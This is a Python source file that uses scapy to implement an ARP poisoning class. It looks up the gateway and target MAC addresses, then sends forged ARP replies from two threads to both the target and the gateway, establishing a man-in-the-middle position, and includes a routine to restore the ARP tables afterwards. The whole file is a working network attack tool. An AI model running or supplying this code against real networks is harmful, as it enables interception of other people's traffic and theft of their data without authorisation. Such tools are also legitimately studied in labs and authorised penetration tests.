import os
import sys
import time
import threading
from scapy.layers.l2 import ARP, Ether, srp1, srp
from scapy.sendrecv import send
from termcolor import colored


def get_gateway_ip():
    return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


def get_mac(ip):
    arp_request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    # send and await response
    answer = srp(arp_request_pkt, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac


class ArpPoisoner:
    def __init__(self, target, gateway, interval, ignore_cache):
        if target is None:
            print(colored("[ARP] Error: Unspecified target.", "red"))
            sys.exit(1)

        if gateway is None:
            self.gateway = get_gateway_ip()
        else:
            self.gateway = gateway

        self.target = target
        self.interval = interval
        self.ignore_cache = ignore_cache

        self.t1 = threading
        self.t2 = threading
        self.thread_lock_event = threading.Event()

    def get_target_mac(self):
        if not self.ignore_cache:
            # Check ARP cache for target MAC address
            cache = os.popen(f"arp -a {self.target}").read().split()
            if len(cache) > 7:
                return cache[3]

        # Create ARP request packet
        ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request = ARP(pdst=self.target)
        broadcast_arp = ether_broadcast / arp_request

        # Send ARP request and listen for valid response
        while True:
            response = srp1(broadcast_arp, verbose=False)
            if response.psrc == self.target:
                return response.hwsrc
            else:
                time.sleep(5)

    def arp_poison(self, target_ip, gateway_ip):
        if target_ip == ARP().psrc:
            target_mac = ARP().hwsrc  # Return MAC address of machine
        else:
            target_mac = self.get_target_mac()  # Get MAC address of target

        # Construct ARP packet
        arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

        # Indefinitely send packets based on thread lock event
        while not self.thread_lock_event.is_set():
            send(arp, verbose=0)
            print(colored(f"[ARP] Sent packet to {target_ip} / {target_mac} from {gateway_ip}.", "light_grey"))
            self.thread_lock_event.wait(self.interval)

    def revert_arp_table(self):
        print(colored("[ARP] Restoring ARP table...", "light_grey"))

        # Get real MAC addresses of the target and gateway
        victim_mac = get_mac(self.target)
        gateway_mac = get_mac(self.gateway)

        packet = ARP(op=2, pdst=self.target, hwdst=victim_mac, psrc=self.gateway, hwsrc=gateway_mac)
        send(packet, verbose=False)

        print(colored("[ARP] ARP table restored.", "light_grey"))

    def lock_threads(self):
        self.thread_lock_event.set()
        self.t1.join()
        self.t2.join()

    def undo(self):
        self.lock_threads()
        self.revert_arp_table()

    def start(self):
        # Poison the target's and gateway's ARP cache to establish a MITM attack
        self.t1 = threading.Thread(target=lambda: self.arp_poison(self.target, self.gateway))
        self.t2 = threading.Thread(target=lambda: self.arp_poison(self.gateway, self.target))

        # Set as daemon threads to allow main thread to exit
        self.t1.daemon = True
        self.t2.daemon = True

        # Simultaneously run the threads
        self.t1.start()
        self.t2.start()

        print(colored("[ARP] Started ARP poisoning.", "light_grey"))
